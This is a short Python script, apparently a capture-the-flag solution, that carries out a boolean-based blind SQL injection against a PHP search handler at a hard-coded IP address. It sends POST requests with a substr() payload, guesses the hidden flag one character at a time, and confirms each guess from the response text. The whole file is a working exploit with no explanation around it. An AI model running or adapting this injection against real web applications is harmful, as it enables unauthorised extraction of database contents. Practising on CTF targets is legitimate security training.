from requests import Request, Session
import urllib.parse, string
table = string.printable

url = "http://83.136.252.214:45440/Controllers/Handlers/SearchHandler.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
flag = ""

while "}" not in flag:
    next_index = len(flag)+1
    for index, char in enumerate(table):
        def gen():
            yield ("search=" + urllib.parse.quote(f"6' and substr(gamedesc,{next_index},1) = '{char}")).encode('utf-8')

        s = Session()
        r = Request('POST', url=url, headers=headers, data=gen())
        req = r.prepare()    
        res = s.send(req)
        if "No post id found" in res.text:
            flag += char
            print(flag)
            break